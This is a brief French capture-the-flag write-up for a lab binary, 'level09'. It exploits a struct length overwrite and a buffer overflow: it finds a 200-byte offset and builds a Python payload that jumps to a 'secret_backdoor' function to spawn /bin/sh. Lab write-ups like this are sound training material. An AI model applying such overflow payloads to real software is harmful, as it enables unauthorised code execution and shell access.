Dans cet exercice on utilise une structure pour écrire on va devoir overflow on peut overwrite la len dans la structure grace à set username et apres tentez d'overflow dans le set_msg

 python -c "print('A' * 40 + '\xff')"

 xff correspondant a la plus grande valeur ascii possible 255

 la fonction secret_backdoor se trouve : 
 0x55555555488c

on va chercher l'offset puis jump a cette fonction

Grace au pattern d'overflow on trouve un offset de 200 
>>> len("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
200

on build le payload :

import struct

print('A'*40 + '\xff')
print('A' * 200 + struct.pack("<Q", 0x55555555488c))
print("/bin/sh")

cat payload - | ./level09